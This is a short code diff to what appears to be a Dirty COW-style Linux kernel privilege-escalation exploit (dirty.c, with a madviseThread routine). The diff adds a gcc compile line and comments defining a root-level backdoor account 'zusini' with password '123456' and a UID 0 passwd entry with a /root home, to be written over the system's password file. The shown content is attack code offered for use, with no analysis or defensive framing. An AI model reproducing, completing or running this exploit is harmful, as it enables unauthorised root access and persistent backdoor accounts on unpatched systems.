@@ -1,3 +1,6 @@
+// Compile with:
+//    gcc -pthread dirty.c -o dirty -lcrypt
+//
 
 #include <fcntl.h>
 #include <pthread.h>
@@ -30,6 +33,8 @@ void *madviseThread(void *arg) {
 int main()
 {
 char *complete_passwd_line = ":x:0:0:,,,:/var/www:/bin/bash     " ;
+//user : zusini passwd: 123456
+//zusini:zuTWBmJcm89rI:0:0:test:/root:/bin/bash
 
   f = open(filename, O_RDONLY);
   fstat(f, &st);
